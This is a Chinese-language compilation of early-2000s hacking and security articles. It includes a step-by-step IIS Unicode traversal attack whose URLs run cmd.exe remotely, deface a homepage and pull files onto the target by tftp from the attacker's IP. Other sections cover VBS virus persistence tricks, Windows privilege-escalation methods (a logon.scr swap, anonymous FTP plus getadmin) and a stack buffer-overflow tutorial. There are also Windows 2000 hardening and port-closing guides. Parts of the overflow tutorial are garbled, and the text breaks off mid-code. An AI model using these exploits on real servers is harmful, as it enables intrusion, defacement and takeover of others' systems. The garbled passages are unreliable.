HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Active Setup\Installed Components\{08B0E5C0-4FCB-11CF-AAA5-00823C913200} "StubPath"

【Unicode漏洞】
1、首先，请大家建立一个文件夹，这样方便存放攻击工具。

2、Unicode漏洞的原理

     此漏洞从中文IIS4.0+SP6开始，还影响中文WIN2000+IIS5.0、中文WIN2000+IIS5.0+SP
1，台湾繁体中文也同样存在这样的漏洞。

     中文版的Win2000中，Unicode漏洞存在BUG，在Unicode编码中：

     %c1%1c -〉 (0xc1 - 0xc0) * 0x40 + 0x1c = 0x5c = '/'
     %c0%2f -〉 (0xc0 - 0xc0) * 0x40 + 0x2f = 0x2f = '\' 

     Win NT4 编码为：%c1%9c
     Win2000 英文版 编码为：%c0%af （更多编码……）

3、检测方法： 

     * 注意：以下编码为“%c0%af”（ %c0%af：为 Win2000 英文版 编码）

     比如说有一IP地址为x.x.x.x的WIN2K主机，我们可以在地址栏输入

     http://x.x.x.x/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir

     如果存在此漏洞的话，我们便可以看到以下的内容：（例子假设"C:\inetpub\scripts
"目录里无文件）

     Directory of C:\inetpub\scripts
     2000-09-28 15:49 〈DIR〉 .
     2000-09-28 15:49 〈DIR〉 ..

     如果目标主机的管理员把该目录删除掉，我们就无法看到了，但是还有以下的目录是同
样可以用来测试的。

     http://x.x.x.x/msadc/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.ex
e?/c+dir

4、漏洞分析：

     从上面的检测中，可以清楚地看到：

     “http://x.x.x.x/scripts/..%c0%af../winnt/system32/cmd.exe?/c+” 之后就是DO
S命令：dir

     如果我们换成：http://x.x.x.x/scripts/..%c0%af../winnt/system32/cmd.exe?/c+d
ir+d:\

     那么，你就可以看到目标主机的 D:\ 的内容。（这里用到的命令是：dir）

     如果我们换成：http://x.x.x.x/scripts/..%c0%af../winnt/system32/cmd.exe?/c+t
ype+d:\hack.bat

     那么，你就可以看到目标主机的 D:\hack.bat 文件的内容。（这里用到的命令是：ty
pe） 

     如果我们换成：http://x.x.x.x/scripts/..%c0%af../winnt/system32/cmd.exe?/c+d
ir+md+d:\hack

     运行后我们可以看到返回这样的结果：
     CGI Error
     The specified CGI application misbehaved by not returning a complete
     set of HTTP headers. The headers it did return are:

     英文意思是：
     CGI错误
     具体的CGI申请有误，不能返回完整的HTTP标题，返回的标题为：

     但，你仍然可以在目标主机的 D:\ 里建立一个名为：hack 的文件夹。（这里用到的命
令是：md）

5、主要命令

     （一）：复制文件且改名的命令

      http://x.x.x.x/scripts/..%c0%af../winnt/system32/cmd.exe?/c+copy+d:\hack.b
at d:\hack\hack.bat

      返回信息：
      CGI Error
      The specified CGI application misbehaved by not returning a complete
      set of HTTP headers. The headers it did return are:
      1 file(s) copied.

      此时，你已经把 d:\hack.bat 复制到 d:\hack\hack.bat （这里用到的命令是：cop
y）

      * 注意：多数时候，你会得不到copy权限。除非你真的碰到了很笨的管理员。

     （二）：显示目标主机当前的环境变量的命令

      http://x.x.x.x/scripts/..%c0%af../winnt/system32/cmd.exe?/c+set

      这个命令比较有用，你在里面可以得到主机的各项信息，对攻击很有帮助的哦！（这
里用到的命令是：set）

     （三）：attrib修改属性命令

      用这命令查文件属性和修改文件的属性。

      http://x.x.x.x/scripts/..%c0%af../winnt/system32/attrib.exe?c:\inetpub\www
root\index.htm

      运行后，我们可以看到index.htm的文件属性，往往有时我们无法修改这文件，是因为
这文件设为只读。（这里用到：attrib.exe）

      http://x.x.x.x/scripts/..%c0%af../winnt/system32/attrib.exe?%20%2br%20%2bh
%20d:\inetpub\wwwroot\index.htm

      运行后，我们可以把index.htm文件设为只读、隐藏。如果我们把某个后门程序隐藏起
来，并且管理没有设置所有文件可见。

      那么是不是很方便上传的东西不被管理员发现呢？

      * 注意：这里 %2b 等于 + 

      http://x.x.x.x/scripts/..%c0%af../winnt/system32/attrib.exe?%20-r%20-h%20d
:\inetpub\wwwroot\index.htm

      运行后解除文件的属性。



      同样，还有很多命令可以执行，大家可以试试，不过有些时间会很久，有些是不能执
行的。

      解释+号，在这里+等于空格键，当然你也可以用空格键，用空格键运行后会转换为%2
0 和%c0%af=/是同一道理的。
　

6、简单地修改主页

     一般情况下，我们要修改目标主机的web文件，常用到的方法是利用echo回显、管道工
具“>” “>>”

     先复习一下这些命令和管道工具的功能：

     D:\>echo/?

     显示信息，或将命令响应打开或关上。
     ECHO [ON | OFF]
     ECHO [message]
     仅键入 ECHO 而不加参数，可以显示当前的 ECHO 设置。

     管道工具“>” “>>” 的功能

     “>”“>>”是将命令产生的输出重新定向,比如写到某个文件或输出到打印机中。

     “>>”产生的内容将追加进文件中，“>”则将原文件内容覆盖。
      

     我们知道IIS加载程序检测到有cmd.exe或者command.com串就要检测特殊字符“&|(,;%
<>”

     如果发现有这些字符就会返回500错误，所以不能直接使用cmd.exe加管道符等。

     如果我们输入：http://x.x.x.x/scripts/..%c0%af../winnt/system32/cmd.exe?/c+e
cho+内容+> d:\hack.bat

     我们可以看到提示
     HTTP 500 - 内部服务器错误
     Internet Explorer

     如果我们要得到echo与>的结合使用，可以这样操作：

     http://x.x.x.x/scripts/..%c0%af../winnt/system32/cmd".exe?/c+echo+内容+> d:
\hack.bat

     注意，与开始的命令的区别只在于cmd后面多了个"字符。

     运行后我们可以看到返回这样的结果：

     CGI Error
     The specified CGI application misbehaved by not returning a complete
     set of HTTP headers. The headers it did return are:

     英文意思是：
     CGI错误
     具体的CGI申请有误，不能返回完整的HTTP标题，返回的标题为：

     实际上，我们已经把“内容”写入到 d:\hack.bat 文件里了。

     利用这样的方法我们可以建立.bat .txt .asp .htm .html 等文件，这对于一个存在这
漏洞的网站可以说是致命打击的开始。

     尤其是能写.bat文件，如果我们在autoexe.bat里面加入format del等命令时，你想结
果会如何？？

     回到修改网站页面的问题来。

     比如说想修改c:\inetpub\wwwroot\default.asp

     我们就可以这样在地址栏输入：

     http://x.x.x.x/scripts/..%c0%af../winnt/system32/cmd".exe?/c+echo+Down+With
+the+USA+> c:\inetpub\wwwroot\default.asp

     那么再看他的首页时，已经被修改为：

    Down With the USA    

     事情就那么简单，任何一个普通人都可以通过地址栏对存在该漏洞的目标主机做最简单
的入侵。

     当然，如果为了方便输入，我们可以把cmd.exe改名为其他名字的文件，比如说hack.e
xe

     http://x.x.x.x/scripts/..%c0%af../winnt/system32/cmd.exe?/c+copy+c:\winnt\s
ystem32\cmd.exe+c:\inetpub\scripts\hack.exe

     以后使用就可以直接用：

     http://x.x.x.x/scripts/c.exe?/c+echo+Down+With+the+USA+> c:\inetpub\wwwroot
\default.asp

7、上传文件

     上传文件的方法有很多种，但最好用的算是 tftp 啦。

     什么是 tftp ？

     简单来说，tftp 就是让你的电脑变成一台服务器，让攻击主机来下载你的文件（本站
有）。

     这样就可以达到上传的目的。

     解压后，运行 tftpd32.exe 。

     在运行它之前，建议关闭其他FTP服务器，保持tftpd运行，这时你的机器已经是一个F
TP服务器了。

     然后，把你要上传的文件，复制到同一目录下。

     回到你的浏览器，在地址栏里填入：

     http://x.x.x.x/scripts/..%c0%af../winnt/system32/cmd.exe?/c+tftp -i y.y.y.y
 GET default.htm c:\\inetpub\\wwwroot\\default.htm

     y.y.y.y为你自己的IP。

     然后等待...IE浏览器左下角显示完成，红色漏斗消失，这时default.htm已经上传到主
机c:\inetpub\wwwroot\目录了。

     您可以自己检查一下。


【VBS脚本病毒”获得控制权的典型方法】
VBS脚本病毒”获得控制权的典型方法

如何获取控制权？这一个是一个比较有趣的话题，而VBS脚本病毒似乎将这个话题发挥的淋漓尽致。在这里列出几种典型的方法： 

    一、修改注册表项 

    windows在启动的时候，会自动加载HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run项下的各键值所执向的程序。脚本病毒可以在此项下加入一个键值指向病毒程序，这样就可以保证每次机器启动的时候拿到控制权。vbs修改贮册表的方法比较简单，直接调用下面语句即可。 

    wsh.RegWrite(strName, anyvalue [,strType])
 
    二、通过映射文件执行方式 

    譬如，我们新欢乐时光将dll的执行方式修改为wscript.exe。甚至可以将exe文件的映射指向病毒代码。 

    三、欺骗用户，让用户自己执行 

    这种方式其实和用户的心理有关。譬如，病毒在发送附件时，采用双后缀的文件名，由于默认情况下，后缀并不显示，举个例子，文件名为beauty.jpg.vbs的vbs程序显示为beauty.jpg，这时用户往往会把它当成一张图片去点击。同样，对于用户自己磁盘中的文件，病毒在感染它们的时候，将原有文件的文件名作为前缀，vbs作为后缀产生一个病毒文件，并删除原来文件，这样，用户就有可能将这个vbs文件看作自己原来的文件运行。 

    四、desktop.ini和folder.htt互相配合 

    这两个文件可以用来配置活动桌面，也可以用来自定义文件夹。如果用户的目录中含有这两个文件，当用户进入该目录时，就会触发folder.htt中的病毒代码。这是新欢乐时光病毒采用的一种比较有效的获取控制权的方法。并且利用folder.htt，还可能触发exe文件，这也可能成为病毒得到控制权的一种有效方法！ 

    病毒获得控制权的方法还有很多，这方面病毒作者发挥的余地也比较大。


【win2000s安全配置】
   win2000s安全配置

本文作者： Sowhat 文章录入：safer
文章出处： www.itsfocus.net 
阅读次数： 34
发布日期： 2003-10-21 
Windows 2000 Server 安全配置终极指南

Windows 2000的服务器在目前的服务器市场中占了相当大的比例。为什么呢？原因很多，操作简单，易于管理，等等等等。但是，微软同时面临的是大家对其产品安全性的指责，埋怨，那么，Windows 2000的安全性真的就那么差劲吗？No！说到底，安全的关键还是在于人的因素。如果配置得当，Windows 2000 的还是相当安全的。
如果你想安装，配置一台提供简单Web服务的Windows 2000 Server ，而又一筹莫展，怎么办？不用急，Follow me！
让我来告诉你，该怎么做，为什么要这么做。本文将带你手把手构建一台安全的Windows 2000 Server。

首先要说明的一点是,世界上没有绝对的安全，我们的目标是达到如下的安全级别：除了那些坚定的并且熟练的黑客外，能够阻止绝大多数黑客访问系统。

（正式展开之前的4点声明：
1，Windows 2000 Server的安全配置是一个很大的课题，由于本人的水平和经验所限，可能错误多多，希望大家指教，大家一起探讨；愿意和我交流的朋友可以到ITSwww.itaq.org讨论，也可以到我的主页去留www.SecurityArt.net
2，本文如果能对你提供些许帮助，将是我莫大的荣耀，也是对我最好的表扬和鼓励。
3，本文的写作过程中，参考了大量相关资料，在此，对其作者表示衷心的感谢！
4，谨以此文送给我的女朋友“珍珠猪”，感谢她在我最困难的时候对我的信任，支持和帮助。祝她在国外的这些日子里，天天快乐）

由于文章比较长，所以，我有必要在一开头的时候，向大家介绍一下本文的结构
・版本的选择问题
・安装，及其过程中应该注意的9个问题
・简单地做一些基本配置
・安装一些组件（如IIS）并做进一步的配置
・更进一步的配置（18个需要主要注意的地方）
・考虑物理安全性

一，版本的选择问题：
选择合适的版本是安装配置Windows 2000的第一步。
国内的大多数使用者，因为不习惯英文界面的操作，而选择安装了Windows 2000 Server中文版。但是殊不知，从这第一步开始，就已经埋下了安全隐患。为什么这么说呢？大家都知道， 微软一向是以Bug和Patch著称的， 过不了几天，就会有一个新的漏洞“问世”，紧跟着，微软就会发布相应的补丁。当然，首先发布的是英文版的补丁，而其他语言版本的补丁一般会延迟一段时间，在这一段时间里，我们的机器对攻击者来说，是赤裸裸的，任人宰割。
所以，我强烈地建议大家尽量地安装英文版。
还有一点，无论是什么语言版本，请不要安装任何Beta版本，因为大多数的Beta版本的操作系统都含有严重的安全缺陷。

二，安装
1,系统要求
首先，我们一起来看看Windows 2000 Server对系统的要求：
133MHz或更高的Pentium兼容的CPU；
至少有256MB的RAM（也支持128MB；最大支持4GB ）；
2GB的硬盘，至少有1.0GB的空闲空间（如果你是通过网络进行安装将需要额外的硬盘空间）；
Windows 2000 Server最多支持在一台机器上有4个CPU ；
VGA分辨率，或者更高档次分辨率的监视器；
CD-ROM驱动器，推荐12速或者更快的速度；
如果计算机不支持从光盘启动安装程序，则还要求有高密度的3.5寸软盘；
如果从网络安装，需要一个或多个与Windows 2000 server 兼容的网卡和相关的电缆。

还有一点需要注意的是，在安装之前，最好确认一下你的硬件是否属于Windows 2000 Server的硬件兼容性列表（HCL）范围内，这是因为，微软只对那些列在Windows 2000 HCL中的设备提供经过测试的驱动程序。如果使用了没有列在HCL中的硬件，在安装过程中，或者安装之后， 可能会引发一些问题。
2，实现途径
实现Windows2000 Server 不外乎两种途径。一种是全新安装，另一种是从其他版本的Windows升级(Windows NT Server3.51或Windows NT Server4.0）。
但是，为了避免升级以后带来的种种问题，建议执行全新安装。

3，分区的问题
有些人在装系统的时候偷懒，只做一个分区，直接安装系统。这样做会带来很大的风险，例如：只有一个分区的话，万一发生IIS缓冲区溢出会直接威胁到系统的安全。 
建议至少3个分区，最好是4个。如C，D，E，F
C盘装系统，2G以上的空间，D盘装IIS，E为FTP，F盘放一些重要的数据。
4,文件格式问题
Windows 2000 Server 既支持FAT格式，也支持NTFS格式。但是我们建议采用NTFS格式，为什么呢？ 因为NTFS格式比FAT格式多了安全控制功能，可以对不同的文件，文件夹设置不同的访问权限，并且可以启用EFS（Encrypt File System)来加密文件，这样就只有授权用户才可以访问，从而提高安全性。而且最好在安装过程中，根据系统提示格式化成NTFS分区，而不要先安装成FAT格式再转化为NTFS格式，因为这样做在有些情况下会导致转化不成功，导致数据的丢失，甚至系统崩溃。 
One coin has two side。NTFS也有它不理的方面---<1>目前大多数反病毒软件没有提供对软盘启动后NTFS分区病毒的查杀，这样一旦系统中了恶性病毒而导致系统不能正常启动，后果会比较严重，因此我们平时做好防病毒工作。<2>ADSs（NTFS交换数据流）是NTFS的一个特征,它是为了和HFS兼容而设计的.可是由于比较难于被发觉,所以对于管理员来说是一种危险,29A的Bennie和Ratter已经发布了一种叫做W2K.Stream病毒,这个病毒就是利用ADSs的.更多的关于NTFS交换数据流的文章请参看：http://go.6to23.com/securityart/ta/ntfs.htm

5,多系统的问题
强烈建议，作为服务器的机器上只安装一个操作系统。因为，安装两个或两个以上的操作系统，会给黑客创造更多的机会。有心的攻击者可能会用DDOS攻击或其他手段，成功地让你系统重启，并进入另一个安全配置较差或根本没配置过的系统，从而击败你的系统。

6,安装时的网络连接问题
Win2000在安装时存在这样一个问题，当我们输入Administrator的密码之后，系统就建立了ADMIN$的共享，但是你刚刚输入的密码并没有“生效”，这种情况一直持续到系统再次启动，也就是说，在重启之前的这个过程中，任何人都可以通过ADMIN$进入机器。
所以，在做完基本的安全配置之前，请不要连入网络。因为这个时候，真的可以说是“人为刀趄，我为鱼肉”。

7，修改默认路径
我们都知道，Windows 2000 的默认路径为（假如C是系统盘）C:\Winnt，我们可以修改为C:\win03478，等无规律的名称。这样也在一定程度上加强了对系统的保护。

8,安装过程中的组件选择问题
<1> 在Windows 2000 server 中，IIS是默认安装的（而在即将发布的Windows Server 2003中，IIS6.0默认是不被安装的。更多关于Windows Server 2003安全性的介绍，请参考我的了另一篇文章http://go.6to23.com/SecurityArt/mya/win2003.htm） ，这就好象在你的机子上开了一扇大门。所以，我们应该对IIS做一些基本的安全配置，而其中的第一步，就是修改默认安装路径路径，把它从系统所在的分区“搬”出去，但是，在安装过程中，如果选择默认安装IIS，我们是没法修改路径的。（除非通过自动安装安装脚本的设置可以改变路径）
所以， 我们这个时候去掉IIS前面的勾，不安装IIS。
<2>其他组件。对于一般的Web服务，以下几个服务是不必要的，而且是极其危险的，应该慎重对待：Indexing Service, FrontPage 2000 Server Extensions, Internet Service Manager (HTML)。
9，补丁的安装时间
补丁的安装应该在安装完所有需要的组件和应用程序以后，这是因为补丁程序往往要替换或者修改一些系统文件，如果先安装补丁再安装应用程序有可能导致补丁无效。
 


【win2000下关闭无用端口】
win2000下关闭无用端口
关于win2000下关闭无用端口的方法，我在以前的贴子和我昨天写的共享文件夹安全中都提到过。
在这里我作为我写的安全知识基础二供大家参考：
每一项服务都对应相应的端口，比如众如周知的WWW服务的端口是80，smtp是25，ftp是21，win2000安装中默认的都是这些服务开启的。对于个人用户来说确实没有必要，关掉端口也就是关闭无用的服务。
“控制面板”的“管理工具”中的“服务”中来配置。
1、关闭7.9等等端口：关闭Simple TCP/IP Service,支持以下 TCP/IP 服务：Character Generator, Daytime, Discard, Echo, 以及 Quote of the Day。
2、关闭80口：关掉WWW服务。在“服务”中显示名称为"World Wide Web Publishing Service"，通过 Internet 信息服务的管理单元提供 Web 连接和管理。
3、关掉25端口：关闭Simple Mail Transport Protocol (SMTP)服务，它提供的功能是跨网传送电子邮件。
4、关掉21端口：关闭FTP Publishing Service,它提供的服务是通过 Internet 信息服务的管理单元提供 FTP 连接和管理。
5、关掉23端口：关闭Telnet服务，它允许远程用户登录到系统并且使用命令行运行控制台程序。
6、还有一个很重要的就是关闭server服务，此服务提供 RPC 支持、文件、打印以及命名管道共享。关掉它就关掉了win2k的默认共享，比如ipc$、c$、admin$等等，此服务关闭不影响您的共他操作。
7、还有一个就是139端口，139端口是NetBIOS　Session端口，用来文件和打印共享，注意的是运行samba的unix机器也开放了139端口，功能一样。以前流光2000用来判断对方主机类型不太准确，估计就是139端口开放既认为是NT机，现在好了。 
关闭139口听方法是在“网络和拨号连接”中“本地连接”中选取“Internet协议(TCP/IP)”属性，进入“高级TCP/IP设置”“WINS设置”里面有一项“禁用TCP/IP的NETBIOS”，打勾就关闭了139端口。
对于个人用户来说，可以在各项服务属性设置中设为“禁用”，以免下次重启服务也重新启动，端口也开放了。



【WIN2000漏洞】
发信人: wangdell (小刀), 信区: hacker
标  题: WIN2000漏洞 
发信站: 北大未名站 (2001年06月13日21:10:55 星期三), 站内信件

标  题: WIN2000漏洞
发信站: 我爱南开站 (Mon Jun 11 22:20:53 2001), 转信

★在Windows 2000远程服务器上的cpu过载
★发送一连串的二进制中的0字符，到达Windows
★2000中的任意一个端口，都可能引起CPU的利用率达到100%。这样的端口包括了TCP中
端口号为7，9，21，23，7778和UDP中端口号为53，67，68，135，500，1812，1813，2
535，3456的这些端口。
★在Windows 2000远程服务器上的DOS操作系统的漏洞
★以Windows2000作为操作平台的服务器作为远程控制台对远程访问进行控制。一个远程
的攻击者向该服务器发了一连串的攻击性代码，使服务器工作出现故障。在此之后，如
果系统通过自动重启后继续工作，那么很多的攻击造成了远程服务器不断的重新启动，
直到重启的频度超出了系统的承受能力,系统崩溃。
另外：
1.如果你有普通用户帐号,有个一个很简单的方法获取NT Administrator帐号:
先把c:\winnt\system32下的logon.scr改名为logon.old备份
然后把usrmgr.exe改名为logon.scr
然后重新启动
logon.scr是启动时加载的程序,重新启动后,不会出现以往的登陆密码输入界面,而是用
户管理器
这时他就有权限把自己加到Administrator组
不要忘记把文件名改回来啊!
2.下面的技术适用于不重视NT网络安全的网站,
一些http的技术也可以供较高级的人员参考
进入Win2K网络可以采取下面的步骤:
因为NT的IIS
server的ftp一般都是允许anonymous匿名帐号进入的,有些anonymous的帐号还有upload
权限,我们就要攻击这类站点。因为如果不允许匿名帐号,就可能造成明文密码在网上传
输。用tcpspy的工具可以截获这
些密码。现在不谈这些比较高级的技术。
正因为允许匿名帐号ftp登陆的设定,也给我们带来了突破NT server的机会。我们用ftp
登陆一个NT
server,比如:xxx.xxx.xxx.xxx(示例名):
ftp xxx.xxx.xxx.xxx
Connected to xxx.xxx.xxx.xxx
220 2000svr Microsoft FTP Service (Version 5.0).
2000svr这个东西暴露了其NETbios名,那么在IIS的背景下,必然会有一个IUSER_2000svr
的用户帐号,属于Domain
user组，这个帐号我们以后要用来获取Administrator的权限
User (xxx.xxx.xxx.xxx none)):anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 输入 guest@ 或者guest
对于缺乏网络安全知识的管理员来说,很多人没有将guest帐号禁止,或者没有设置密码。
那么guest帐号就是一个可用的正确的用户帐号，虽然只属于Domain
guest组
在这种情况下我们就可以进NT server的ftp了。
现在,开始查找cgi-bin目录(或者scripts目录),进去以后,
把winnt下的cmd.execopy到cgi-bin,把getadmin和gasys.dll传上去到cgi-bin
然后输入:http://www.xxx.com/cgi-bin/getadmin.exe?IUSR_SATURN
大约十多秒后屏幕显示:
CGI Error
这时有90%的可能是:你已经把IUSER_2000svr升级为Administrator,也就是任何访问该w
eb站的人都是管理员
Windows 2000缓冲区溢出入门
　　我在互联网上阅读过许多关于缓冲区溢出的文章。其中的绝大多数都是基于*NIX操
作系统平台的。后来有幸拜读了ipxodi所著的《Windows系统下的堆栈溢出》（已刊登在
绿盟网络安全月刊2000年第三?谥 ），又碰巧看到了Jason先生的《Windows
NT Buffer Overflow’s From Start to
Finish》，得益匪浅。在翻译Jason先生的文章时，由于我的机器安装了Windows 2000
Server，在调试原文程序时发现细节略有出入。因此本文提供的有关源程序、动态链接
库、偏移量等是以我在自己机器上调试为准。（对不同版本的动态链接库，都需要编程
者自己调试。）
　　这篇文章应该属入门级。虽然比较简单，但对于Windows系统下的缓冲区溢出具有一
定的通用性。例如，堆栈溢出地址的确定，跳转指令的查找和使用，溢出执行代码的编
写，等等。只要发现Windows系统下存在缓冲区溢出漏洞的程序，基本上都可通过这些步
骤进行攻击测试。但正如ipxodi所指出的，由于Windows下动态链接库的版本更新较快，
一定要根据编程者的实际平台进行调试。在发布此类安全漏? 公告或溢出攻击程序时，?
创 码、系统平?和动态链接库的版本号都应该尽量列清楚。否则别人调?起来可能会?
 疼得很厉害。；?P>--[
调试、测试环境
Microsoft Visual C++ 6.0
Microsoft Windows 2000 Server （中文版，内部版本号：2195）
--[ 调试、测试过程
首先，写一个存在缓冲区溢出漏洞的应用程序。该程序可读取文件的内容，这样我们就
能通过修改被读取文件的内容来使程序溢出。;-)　在Visual
C++开发环境中创建一个新的控制台应用程序，选择”An Application that supports
MFC”并单击”Finish”。（注：其实并不一定非是MFC应用程序不可，只不过是我自己
的习惯而已。;-）））向这个应用程序中添加一些必要的代码，如下：
CWinApp theApp;
using namespace std;
void overflow(char* buff);
void overflow(char* buff)
{
CFile file;
CFileException er;
if(!file.Open(_T("overflow.txt"),CFile::modeRead,&er))
{
er.ReportError();
return;
}
int x = file.GetLength();
file.Read(buff,x);
}
int _tmain(int argc, TCHAR* argv[], TCHAR* envp[])
{
int nRetCode = 0;
// initialize MFC and print and error on failure
if (!AfxWinInit(::GetModuleHandle(NULL), NULL, ::GetCommandLine(), 0))
{
// TODO: change error code to suit your needs
cerr << _T("Fatal Error: MFC initialization failed") << endl;
nRetCode = 1;
}
else
{
char buff[10];
overflow(buff);
}
return nRetCode;
}
　　现在先来分析一下上面这段C＋＋代码，找一找哪里有漏洞。这是一个MFC控制台应
用程序，”main”函数与其它程序会有些不同，但工作机制基本一致。我们主要分析该
函数中”else”那段代码。首先
是第一行”char
buff[10]”，定义了一个10字符长的本地变量。我们都知道，本地变量的内存空间是在
堆栈里分配的。（如果你连这个都不知道，建议不要继续往下看了。：））然后是将bu
ff变量作为参数调用overflow函
数。好了，现在让我们分析overflow函数。首先是一个Cfile对象，然后是一个CfileEx
ception对象。接下来会试图以读权限打开当前目录下的文件”overflow.txt”。如果打
开成功，则将该文件中的所有? 容读取到buff数组变量中。发现了问题没有？buff变量
只有10字符长。如果读取的文件内容长度是100时会发生什么问题呢？对了，“缓冲区溢
出”！而且是在堆栈中发生的缓冲区溢出。在后面的测试中就
能看到，我们利用这个漏洞能做些什么！；）现在让我们创建文本文件”overflow.txt
”，并将它放到这个应用程序的project目录下。
在进行下一步前，先让我们探讨一下关于Windows
NT/2000的内存结构。NT/2000的每一个进程都在启动时分配了4GB（0xFFFFFFFF）的虚拟
内存。其中的某些部份实际上是由所有进程共享的，例如核心和设备驱动程序区域。但
它们都会被映射到每个进程的? 拟地址空?里。实际上没有进程分配?GB的物理内存，
而是仅当需要时才分配物理内存。因此每一个进程都有各自的4GB虚拟内存，编址范围从
0x00000000到0xFFFFFFFF。其中，0x00000000－0x0000FFFF?俏NULL指针分配而保留的
。访问该区域内存将导致“非法访问”错误。0x00010000－0x7FFEFFFF是用户进程空间
。EXE文件的映像被加载到其中（起始地址0x00400000），DLL（动态链接库）也被加载
到这? 份空间。如果DLL或EXE的代码被装入到该范围的某些地址，就能够被执行。访问
该区域中没有代码装入的地址将导致“非法访问”错误。0x7FFF0000－0x7FFFFFFF是保
留区域，对此区域的任何访问都将导? “非法访问?错误?x80000000－0xFFFFFFFF仅供
操作系统使用。用于加载设备驱动程序和其它核心级代码。从用户级应用程序（ring
3）访问此区域将导致“非法访问”错误。
现在回到”overflow.txt”文件。现在我们将向这个文本文件中不断添加字符，直到弹
出应用程序非法访问的系统对话框。在这里，填充什么字符是很重要的（原因待会就知
道了）。我选择小写字母”a”? 填充文本文件。我们已经知道缓冲区只?0字符长，那
么先填充11个字符。（注意：以debug方式编译应用程序，否则结果可能会有所不同。）
咦？没反应。我们继续填充字符……直到填充了18个字符应用
程序才崩溃。但这个崩溃对我们的用处还不大。继续填充！当字符串长度为24时，运行
程序并观察弹出的对话框信息：“”0x61616161”指令引用的”0x61616161”内存。该
内存不能为”written”。”我? 大家都应该知道?x61”所代表的ASCII码是什么吧？；
）如果你的机器安装了Visual
C++，单击“取消”按钮就能够调试该应用程序。进入调试环境后，选择”view”菜单D
D”debug
windows”DD”registers”，可打开寄存器窗口。如果你对汇编一窍不通，建议先フ
 本汇编的书看看。在寄存器窗口里会看到EAX、EBS和EIP等寄存器的内容。EIP当然是最
重要的了。EIP的内容就是程?蛳 一步所要执行指令的地址。我们注意到ESP寄存器的值
未被破坏，而且似乎离我们的buff变量不远。下一步我们需要找出ESP的值是如何处理得
到的。
现在开始会复杂些了（而这就是乐趣的源泉！：））。
在main函数的最后一行代码处设置断点，因为我们只关心这里所发生的事情。现在启动
调试器，并让程序无故障运行到该断点。然后切换到反汇编窗口（按Alt+8，或单击”V
iew”DD”debug
windows”DD”disassembly”）。另外还要打开内存窗口和寄存器窗口。
0040155B 5F pop edi
0040155C 5E pop esi
0040155D 5B pop ebx
0040155E 83 C4 50 add esp,50h
00401561 3B EC cmp ebp,esp
00401563 E8 7E 00 00 00 call _chkesp (004015e6)
00401568 8B E5 mov esp,ebp
0040156A 5D pop ebp
0040156B C3 ret
以上这些东西是什么？汇编代码。如果你对汇编一点都不懂，我在这里做一些简单的说
明。第一行是”pop
edi”。指令pop用于将仅次于 颜欢ザ 的数据移到其后的指定寄存器中。需要注意的是
ESP寄存器。ESP是32位堆栈指针。一个pop指令移动 颜欢ザ 的一个数据单元，在这里是
DWORD（双字，4字节），到指? 寄存器中，并将堆栈指针?（因为共移动了4字节）。在
执行下一步前，让我们看一下ESP寄存器。在内存窗口中输入ESP，就能得到ESP当前指向
的地址和内容。看一下ESP指向的内存地址中4个字节的内容
和EDI寄存器的内容。现在单步执行”pop.edi”，我们能够看到EDI寄存器中填入了ESP
所指向的内存地址的数值，同时ESP的数值也增加了4。后面的两条指令是一样的，只不
过寄存器不同罢了。单步执行它
们。跟着的三行指令对本文没什么意义，所以在这里不作解释。单步执行到指令”mov
esp,
ebp”，该指令会将EBP的值赋给ESP寄存器。然后是指令”pop
ebp”，这条指令很重要。先让我们在内存窗口输入ESP，可以看到该内存地址有一串”
0x61”（’a’的16进制值）。因此0x61616161将被弹出到EBP寄存器中。单步执行该指
令可以检验我说的没错吧？；）
好了，虽然我说的没错，但好象我们还没能得到什么有用的东西？现在到了最后一条指
令”ret”。指令”ret”在汇编中是返回指令。它是如何知道应该返回到哪里的呢？由
当前位于 颜欢ザ 的数值决定。
这条指令如果用pop指令表示的话可以表示为”pop
eip”（虽然实际上你无法执行这条pop指令；））。它从ESP所指向内存地址处弹出4字
节内容，并赋给EIP寄存器（EIP寄存器是32位指令指针）。这就意味着，不管EIP指向哪
个内存地址，该地址处的指令? 总会成为下一条指令。我们再次在内存窗口中输入ESP，
看一下将要赋给EIP寄存器的地址的指令是什么。其实我想此时大家都应该知道是4个字
节长的0x61串。现在让我们单步执行该指令，看到EIP的值为0
x61616161，也就是说下一指令地址为0x61616161，但指令却显示为???（意为无效指令
）。因此再单步执行指令将导致“访问非法”错误。现在再看看ESP寄存器。它正确地指
向了堆栈中的下一个数值。也? 是说，下一?工作是确定在使缓冲区成功溢出（EIP＝0
x61616161）时，ESP所指向的地址是否能够存放我们的溢出代码！我们在overflow.txt
文件中再次增加4个’a’（共28个’a’），并再次调试程序，
在执行到”ret”指令时观察内存窗口和寄存器窗口，会发现执行”ret”指令后ESP所指
向内存地址的内容为4字节长的0x61串。Great！这意味着什么？！这个让大家自己想去
吧。；）））
现在我再回过头来分析一下。我们刚才使用字符’a’（0x61）作为文本文件的填充内容
，以确定存在缓冲区溢出。由于EIP＝0x61616161，当我们的程序访问试图访问该地址处
的指令时，会因为是无效指令
而导致系统出错。但如果所指向的地址存在可执行代码时又如何呢？例如装入内存的DL
L代码等。哈哈，这样的话就会执行这些指令，从而可能做一些别人想像不到的事！；）

好了，到目前为止，我们已经能控制EIP的数值，也知道ESP指向的堆栈位置，和能够向
堆栈写入任意数据。那么下一步做什么呢？当然是找到使系统执行我们的溢出代码的方
法了。如果你看过ipxodi所著的
文章《Windows系统下的堆栈溢出》，就会知道采用跳转指令（jmp
esp）是最好不过的了。原因在这里就不再多讲，请大家仔细阅读《Windows系统下的堆
栈溢出》就清楚了。正如前面分析过的，这是因为执行完ret指令后ESP正好能够指向我
们的溢出代码！（……哦，找不
到，我没分析过？在本文中查找单词”Great”吧，呵呵。）现在我们就要在应用程序的
内存空间中找到含有”jmp
esp”指令的地址。首先当然是确定这条指令的机器码了。怎么确定？这也要教？好吧，
教就教吧。仅此一次，下不违例。；）其实方法很简单，按以下步骤就可以了。先在Vi
sual
C++中创建新的应用程序。（当然还是控制台程序，还是支持MFC，这是我的习惯。呵呵
。）输入以下代码：
CWinApp theApp;
using namespace std;
int _tmain(int argc, TCHAR* argv[], TCHAR* envp[])
{
int nRetCode = 0;
// initialize MFC and print and error on failure
